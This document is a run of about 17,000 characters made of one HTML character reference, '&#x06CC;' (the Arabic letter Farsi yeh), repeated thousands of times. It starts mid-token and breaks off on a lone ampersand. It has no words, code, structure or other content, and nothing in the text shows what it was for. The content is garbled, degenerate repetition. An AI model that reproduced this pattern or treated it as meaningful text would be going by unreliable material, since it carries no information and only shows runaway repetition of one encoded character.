x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&